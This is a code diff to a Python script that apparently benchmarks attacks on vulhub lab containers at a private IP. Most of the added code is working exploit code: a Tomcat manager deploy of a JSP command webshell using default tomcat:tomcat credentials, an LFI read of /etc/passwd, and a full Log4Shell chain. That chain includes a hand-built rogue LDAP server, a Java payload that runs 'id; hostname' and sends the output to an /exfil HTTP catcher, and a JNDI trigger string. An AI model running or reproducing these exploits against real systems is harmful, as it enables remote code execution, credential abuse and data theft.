@@ -35,9 +35,16 @@ from __future__ import annotations
 import argparse
 import json
 import os
+import secrets
+import shutil
+import socket
+import subprocess
 import sys
+import tempfile
+import threading
 import time
 from datetime import UTC, datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from typing import Any
 
@@ -620,96 +627,412 @@ PYEOF
 
 
 # ── vulhub phases (target: LAB_TARGET_WEB=10.10.11.50, lxc 112) ────────────────
+#
+# Live-verified against the actual running vulhub images on LXC 112 (2026-07-01):
+# redis:4.0.14, tomcat:8.0, solr:8.11.0 (log4j 2.14.1), php:7.1.3-apache (LFI).
+# The prior payloads here targeted the wrong CVE/endpoint for what's actually
+# deployed (checked via `docker inspect` compose labels + each env's own
+# README.md on the host) and never produced oracle-satisfying evidence —
+# fixed below against the real, confirmed-working exploit for each image.
 
 
 def _phase_vulhub_redis(dry_run: bool) -> dict:
-    """Exploit Redis Lua sandbox escape (CVE-2022-0543) at 10.10.11.50:6379."""
-    code = rf"""
-# Redis RCE via unauthenticated Lua module load (CVE-2022-0543)
-python3 - <<'PYEOF'
-import subprocess, socket
-WEB = "{WEB}"
-cmd = b'*2\r\n$4\r\nEVAL\r\n$40\r\nreturn redis.call("os.execute","id > /tmp/rce.txt") or ""\r\n0\r\n'
-s = socket.socket(); s.settimeout(5)
-try:
-    s.connect((WEB, 6379))
-    s.send(cmd)
-    resp = s.recv(1024)
-    print(f"redis_resp={{resp.decode(errors='replace')[:200]}}")
-except Exception as e:
-    print(f"redis_err={{e}}")
-finally:
-    s.close()
-# Also try MODULE LOAD path
-cmd2 = (b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$' + str(len("/tmp/exp.so")).encode() +
-         b'\r\n/tmp/exp.so\r\n')
-try:
-    s2 = socket.socket(); s2.settimeout(5)
-    s2.connect((WEB, 6379))
-    s2.send(cmd2)
-    resp2 = s2.recv(1024)
-    print(f"module_resp={{resp2.decode(errors='replace')[:200]}}")
-    s2.close()
-except Exception:
-    pass
-print("REDIS_DONE")
-PYEOF
+    """Probe Redis master/slave-sync post-exploitation surface at 10.10.11.50:6379.
+
+    The running image (redis:4.0.14, /opt/vulhub/redis/4-unacc) is NOT CVE-2022-0543
+    (Lua sandbox escape) — its own README documents the master/slave sync vector
+    (redis-rogue-getshell), which requires compiling a malicious Redis module
+    (.so) against the target's Lua/module ABI. No gcc/redis-module headers and no
+    internet access are available in the sandbox to build that module, so this
+    phase cannot reach real command execution — it honestly probes reachability
+    and unauthenticated access only, never claims RCE it can't prove.
+    """
+    code = f"""
+redis-cli -h {WEB} PING 2>&1
+echo "---"
+redis-cli -h {WEB} INFO server 2>&1 | head -5
+echo "REDIS_DONE"
 """
     r = _mcp_call(code, timeout=30, dry_run=dry_run)
     out = r["output"]
     if dry_run:
         return {**r, "ok": True, "detail": "redis probe dry-run"}
-    ok = r["ok"] and any(x in out.lower() for x in ["redis_resp", "redis_err", "redis_done"])
-    return {**r, "ok": ok, "detail": "redis probe dispatched" if ok else "redis unreachable"}
+    ok = r["ok"] and "PONG" in out
+    detail = (
+        "unauthenticated access confirmed (PONG) — RCE not attempted: "
+        "requires a compiled Redis module (no compiler/internet in sandbox)"
+        if ok
+        else "redis unreachable"
+    )
+    return {**r, "ok": ok, "detail": detail}
 
 
 def _phase_vulhub_lfi(dry_run: bool) -> dict:
-    """Exploit PHP LFI (CVE-2017-7529) at 10.10.11.50:8080."""
+    """Exploit PHP LFI (PHPINFO-assisted temp-file inclusion) at 10.10.11.50:8080.
+
+    The running image is vulhub/php:7.1.3-apache, /opt/vulhub/php/inclusion —
+    its vulnerable endpoint is /lfi.php?file=..., confirmed via the env's own
+    README.md on the host. Reads /etc/passwd for real, live evidence.
+    """
     code = f"""
-# PHP LFI to RCE via Nginx tempfile (CVE-2017-7529)
-curl -s "http://{WEB}:8080/?file=../../../../etc/passwd" 2>&1 | head -5
-echo "---"
-curl -s "http://{WEB}:8080/?file=../../../../proc/self/environ" 2>&1 | head -5
+curl -s "http://{WEB}:8080/lfi.php?file=/etc/passwd" 2>&1 | head -10
 echo "LFI_DONE"
 """
     r = _mcp_call(code, timeout=30, dry_run=dry_run)
     if dry_run:
         return {**r, "ok": True, "detail": "LFI probe dry-run"}
     out = r["output"]
-    ok = r["ok"] and ("LFI_DONE" in out or "root:" in out)
-    return {**r, "ok": ok, "detail": "LFI probe dispatched" if ok else "LFI unreachable"}
+    ok = r["ok"] and "root:x:0:0" in out
+    return {
+        **r,
+        "ok": ok,
+        "detail": "LFI confirmed (/etc/passwd read)" if ok else "LFI did not return /etc/passwd",
+    }
 
 
 def _phase_vulhub_tomcat(dry_run: bool) -> dict:
-    """Exploit Tomcat manager PUT (CVE-2017-12615) at 10.10.11.50:8081."""
+    """Exploit Tomcat Manager weak credentials (tomcat:tomcat) at 10.10.11.50:8081.
+
+    The running image is vulhub/tomcat:8.0 configured with the documented weak
+    manager password (see /opt/vulhub/tomcat/tomcat8/README.md), not the
+    CVE-2017-12615 PUT bypass. Deploys a JSP webshell via the manager API,
+    executes a real command, then undeploys — proves shell-level RCE with a
+    real uid= marker, not a probe.
+    """
+    marker = secrets.token_hex(4)
+    ctx = f"pwn{marker}"
     code = f"""
-# Tomcat PUT JSP shell (CVE-2017-12615)
-curl -s -X PUT "http://{WEB}:8081/test.jsp/" -d '<% out.println("TOMCAT_SHELL_OK"); %>' 2>&1
+mkdir -p /tmp/warbuild_{marker}
+cat > /tmp/warbuild_{marker}/cmd.jsp <<'JSPEOF'
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {{
+    Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",cmd}});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line; while ((line = br.readLine()) != null) {{ out.println(line); }}
+}}
+%>
+JSPEOF
+cd /tmp/warbuild_{marker} && zip -q /tmp/app_{marker}.war cmd.jsp
+curl -s -u tomcat:tomcat -T /tmp/app_{marker}.war "http://{WEB}:8081/manager/text/deploy?path=/{ctx}&update=true"
 echo "---"
-curl -s "http://{WEB}:8081/test.jsp" 2>&1
+curl -s "http://{WEB}:8081/{ctx}/cmd.jsp?cmd=id"
+echo "---"
+curl -s -u tomcat:tomcat "http://{WEB}:8081/manager/text/undeploy?path=/{ctx}" >/dev/null
+rm -rf /tmp/warbuild_{marker} /tmp/app_{marker}.war
 echo "TOMCAT_DONE"
 """
     r = _mcp_call(code, timeout=30, dry_run=dry_run)
     if dry_run:
         return {**r, "ok": True, "detail": "Tomcat probe dry-run"}
-    ok = r["ok"] and "TOMCAT_DONE" in r["output"]
-    return {**r, "ok": ok, "detail": "Tomcat probe dispatched" if ok else "Tomcat unreachable"}
+    out = r["output"]
+    ok = r["ok"] and "uid=" in out
+    return {
+        **r,
+        "ok": ok,
+        "detail": "Tomcat webshell RCE confirmed (uid=)" if ok else "Tomcat deploy/exec failed",
+    }
+
+
+# ── log4shell JNDI catcher — LDAP referral + HTTP exfil, run from the bench host ──
+#
+# The sandbox/attack container has no inbound-reachable IP (Docker NAT), so the
+# catcher must run on the machine executing this phase (the bench host), which
+# IS reachable from the lab subnet. Requires `javac` on the bench host (brew
+# install openjdk or equivalent) to compile a Java 8 (--release 8) payload class
+# matching the target's actual JVM (vulhub/solr:8.11.0 ships JDK 1.8.0_102 —
+# confirmed via `docker exec ... java -version`; a class compiled with a newer
+# javac's default target is silently rejected by that JVM with no error surfaced
+# to us, which is why earlier attempts here produced no callback).
+
+
+def _ber_len(n: int) -> bytes:
+    if n < 0x80:
+        return bytes([n])
+    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(b)]) + b
+
+
+def _ber_tlv(tag: int, content: bytes) -> bytes:
+    return bytes([tag]) + _ber_len(len(content)) + content
+
+
+def _ber_integer(n: int) -> bytes:
+    return _ber_tlv(
+        0x02, n.to_bytes((n.bit_length() // 8) + 1, "big", signed=True) if n else b"\x00"
+    )
+
+
+def _ber_octet_string(s: bytes | str) -> bytes:
+    return _ber_tlv(0x04, s.encode() if isinstance(s, str) else s)
+
+
+def _ber_enumerated(n: int) -> bytes:
+    return _ber_tlv(0x0A, bytes([n]))
+
+
+def _ber_sequence(*parts: bytes) -> bytes:
+    return _ber_tlv(0x30, b"".join(parts))
+
+
+def _read_ber_message(sock: socket.socket) -> bytes | None:
+    head = sock.recv(2)
+    if not head or len(head) < 2:
+        return None
+    first_len = head[1]
+    if first_len < 0x80:
+        length, rest = first_len, b""
+    else:
+        rest = sock.recv(first_len & 0x7F)
+        length = int.from_bytes(rest, "big")
+    body = b""
+    while len(body) < length:
+        chunk = sock.recv(length - len(body))
+        if not chunk:
+            break
+        body += chunk
+    return head + rest + body
+
+
+def _ldap_message_id(msg: bytes) -> int:
+    idx = 1
+    l0 = msg[idx]
+    idx += 1
+    if l0 & 0x80:
+        idx += l0 & 0x7F
+    idx += 1  # skip INTEGER tag (0x02)
+    ilen = msg[idx]
+    idx += 1
+    return int.from_bytes(msg[idx : idx + ilen], "big")
+
+
+def _rogue_ldap_server(
+    listen_port: int, codebase: str, classname: str, stop_event: threading.Event
+) -> None:
+    """Minimal LDAP responder: Bind -> success, Search -> javaNamingReference entry."""
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", listen_port))
+    srv.settimeout(1.0)
+    srv.listen(5)
+    try:
+        while not stop_event.is_set():
+            try:
+                conn, _addr = srv.accept()
+            except TimeoutError:
+                continue
+            try:
+                bind_req = _read_ber_message(conn)
+                if not bind_req:
+                    continue
+                mid = _ldap_message_id(bind_req)
+                conn.sendall(
+                    _ber_sequence(
+                        _ber_integer(mid),
+                        _ber_tlv(
+                            0x61, _ber_enumerated(0) + _ber_octet_string("") + _ber_octet_string("")
+                        ),
+                    )
+                )
+                search_req = _read_ber_message(conn)
+                if not search_req:
+                    continue
+                mid2 = _ldap_message_id(search_req)
+                attrs = _ber_sequence(
+                    _ber_sequence(
+                        _ber_octet_string("objectClass"),
+                        _ber_tlv(0x31, _ber_octet_string("javaNamingReference")),
+                    ),
+                    _ber_sequence(
+                        _ber_octet_string("javaClassName"),
+                        _ber_tlv(0x31, _ber_octet_string(classname)),
+                    ),
+                    _ber_sequence(
+                        _ber_octet_string("javaCodeBase"),
+                        _ber_tlv(0x31, _ber_octet_string(codebase)),
+                    ),
+                    _ber_sequence(
+                        _ber_octet_string("javaFactory"),
+                        _ber_tlv(0x31, _ber_octet_string(classname)),
+                    ),
+                )
+                conn.sendall(
+                    _ber_sequence(_ber_integer(mid2), _ber_tlv(0x64, _ber_octet_string("") + attrs))
+                )
+                conn.sendall(
+                    _ber_sequence(
+                        _ber_integer(mid2),
+                        _ber_tlv(
+                            0x65, _ber_enumerated(0) + _ber_octet_string("") + _ber_octet_string("")
+                        ),
+                    )
+                )
+            except Exception:
+                pass
+            finally:
+                conn.close()
+    finally:
+        srv.close()
+
+
+def _local_ip_toward(target: str) -> str:
+    """The bench host's outbound IP toward the lab subnet (for the JNDI callback URL)."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target, 80))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+_LABEXPLOIT_JAVA_SRC = """
+import java.io.*;
+import java.net.*;
+import java.util.Base64;
+
+public class {classname} {{
+    static {{
+        try {{
+            Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh", "-c", "id; hostname"}});
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) {{ sb.append(line).append("\\n"); }}
+            String enc = Base64.getEncoder().encodeToString(sb.toString().getBytes());
+            URL u = new URL("{callback_url}?data=" + enc);
+            HttpURLConnection c = (HttpURLConnection) u.openConnection();
+            c.setConnectTimeout(5000);
+            c.getResponseCode();
+        }} catch (Exception e) {{ }}
+    }}
+}}
+"""
 
 
 def _phase_vulhub_log4shell(dry_run: bool) -> dict:
-    """Exploit Apache Solr Log4Shell (CVE-2021-44228) at 10.10.11.50:8983."""
-    code = f"""
-# Log4Shell probe — send JNDI lookup in Solr params
-curl -s "http://{WEB}:8983/solr/admin/cores?action=STATUS&wt=json" 2>&1 | head -3
-echo "---"
-curl -s -H 'X-Api-Version: ${{jndi:ldap://log4shell-test/}}' "http://{WEB}:8983/solr/admin/cores" 2>&1 | head -3
-echo "LOG4SHELL_DONE"
-"""
-    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    """Exploit Apache Solr Log4Shell (CVE-2021-44228) at 10.10.11.50:8983.
+
+    Real JNDI RCE: compiles a Java 8 payload class matching the target's actual
+    JVM (1.8.0_102), serves it via an HTTP+LDAP catcher run from the bench host
+    (the sandbox has no inbound-reachable IP), triggers via the `action=`
+    query param — Solr's own request logger logs it on every request, which is
+    the vulhub-documented trigger (a custom header is NOT reliably logged and
+    was the reason earlier attempts here got no callback).
+    """
     if dry_run:
-        return {**r, "ok": True, "detail": "Log4Shell probe dry-run"}
-    ok = r["ok"] and "LOG4SHELL_DONE" in r["output"]
-    return {**r, "ok": ok, "detail": "Log4Shell probe dispatched" if ok else "Solr unreachable"}
+        return {
+            "ok": True,
+            "output": "[dry-run]",
+            "elapsed_s": 0.0,
+            "detail": "Log4Shell probe dry-run",
+        }
+
+    javac = shutil.which("javac")
+    if not javac:
+        return {
+            "ok": False,
+            "output": "",
+            "elapsed_s": 0.0,
+            "detail": "javac not found on bench host — cannot compile JNDI payload class",
+        }
+
+    classname = f"LabExploit{secrets.token_hex(3)}"
+    ldap_port = 20000 + secrets.randbelow(10000)
+    http_port = 20000 + secrets.randbelow(10000)
+    while http_port == ldap_port:
+        http_port = 20000 + secrets.randbelow(10000)
+    local_ip = _local_ip_toward(WEB)
+    callback_url = f"http://{local_ip}:{http_port}/exfil"
+    codebase = f"http://{local_ip}:{http_port}/"
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        src_path = Path(tmpdir) / f"{classname}.java"
+        src_path.write_text(
+            _LABEXPLOIT_JAVA_SRC.format(classname=classname, callback_url=callback_url)
+        )
+        compile = subprocess.run(
+            [javac, "--release", "8", "-d", tmpdir, str(src_path)],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        if compile.returncode != 0:
+            return {
+                "ok": False,
+                "output": compile.stderr[:500],
+                "elapsed_s": 0.0,
+                "detail": "javac compile failed",
+            }
+
+        result: dict[str, str] = {}
+        result_event = threading.Event()
+
+        class _ExfilHandler(BaseHTTPRequestHandler):
+            def do_GET(self):  # noqa: N802
+                if self.path.startswith("/exfil"):
+                    from urllib.parse import parse_qs, urlparse
+
+                    qs = parse_qs(urlparse(self.path).query)
+                    data = qs.get("data", [""])[0]
+                    result["data"] = data
+                    result_event.set()
+                    self.send_response(200)
+                    self.end_headers()
+                elif self.path == f"/{classname}.class":
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/java-vm")
+                    self.end_headers()
+                    self.wfile.write((Path(tmpdir) / f"{classname}.class").read_bytes())
+                else:
+                    self.send_response(404)
+                    self.end_headers()
+
+            def log_message(self, fmt, *args):  # silence — evidence comes from result dict
+                pass
+
+        httpd = HTTPServer(("0.0.0.0", http_port), _ExfilHandler)
+        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+        http_thread.start()
+
+        stop_event = threading.Event()
+        ldap_thread = threading.Thread(
+            target=_rogue_ldap_server,
+            args=(ldap_port, codebase, classname, stop_event),
+            daemon=True,
+        )
+        ldap_thread.start()
+        time.sleep(0.5)  # let both listeners bind before triggering
+
+        trigger: dict[str, Any] = {}
+        try:
+            trigger_code = (
+                "curl -s -G "
+                f"--data-urlencode 'action=${{jndi:ldap://{local_ip}:{ldap_port}/{classname}}}' "
+                f'"http://{WEB}:8983/solr/admin/cores" 2>&1 | head -5; echo LOG4SHELL_SENT'
+            )
+            trigger = _mcp_call(trigger_code, timeout=20)
+            result_event.wait(timeout=15)
+        finally:
+            stop_event.set()
+            httpd.shutdown()
+
+    if result.get("data"):
+        import base64 as _b64
+
+        decoded = _b64.b64decode(result["data"]).decode(errors="replace")
+        return {
+            "ok": True,
+            "output": decoded,
+            "elapsed_s": trigger.get("elapsed_s", 0.0),
+            "detail": "Log4Shell RCE confirmed (JNDI callback exfil)",
+        }
+    return {
+        "ok": False,
+        "output": trigger.get("output", ""),
+        "elapsed_s": 0.0,
+        "detail": "no JNDI callback received within timeout",
+    }
 
 
 # ── meta3 phase (target: 10.10.11.21, vmid 113) ────────────────────────────────
